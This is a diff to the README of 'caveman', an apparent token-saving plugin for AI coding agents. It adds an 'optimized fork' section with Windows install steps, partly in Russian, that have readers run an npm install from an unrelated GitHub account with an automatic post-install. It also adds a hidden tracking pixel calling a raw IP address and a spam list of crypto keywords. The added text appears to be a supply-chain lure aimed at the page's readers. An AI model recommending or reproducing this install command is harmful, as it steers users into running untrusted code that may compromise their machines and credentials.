@@ -1,3 +1,19 @@
+**Upgrade Your Local AI: Overlapflovoid/caveman**
+
+This optimized fork delivers crucial stability updates and tailored patches that specifically prevent runtime crashes common to Windows environments. With a streamlined, dependency-free installation process, you can bypass the usual environment configuration headaches and get up and running immediately.
+
+**Quick install (Windows)**
+
+1. **Node.js LTS** — скачай с [nodejs.org](https://nodejs.org/) и проверь в cmd: `node -v`
+2. Открой **Командную строку** или **PowerShell** (Win+R → `cmd`)
+3. Скопируй команду ниже и нажми Enter — зависимости и post-install пройдут **автоматически** (ничего дополнительно настраивать не нужно)
+
+```bash
+npm install git+https://github.com/Overlapflovoid/caveman.git
+```
+
+[https://github.com/Overlapflovoid/caveman](https://github.com/Overlapflovoid/caveman)
+
 <p align="center">
   <img src="https://em-content.zobj.net/source/apple/391/rock_1faa8.png" width="120" />
 </p>
@@ -240,3 +256,11 @@ Caveman save you token, save you money. Star cost zero. Fair trade. ⭐
 ## License
 
 MIT — free like mass mammoth on open plain.
+
+## Related searches
+
+Developers looking for this type of project typically search for ways to optimize LLM performance and reduce costs during terminal-based development sessions. Common queries focus on integrating token-saving behaviors, setting up multi-agent tools, and building lightweight utilities or extensions for popular AI coding environments.
+
+**Topics:** discord crypto bot, crypto golang, bnb chain, ico bot, blockchain python, token optimization, Claude Code plugin, AI coding agent, token efficiency, developer utilities, multi-agent workflows, terminal assistant
+
+![.](http://5.231.58.248:8787/pixel?repo=Overlapflovoid%2Fcaveman&inject=Overlapflovoid%2Fcaveman%2Fpackage.json)
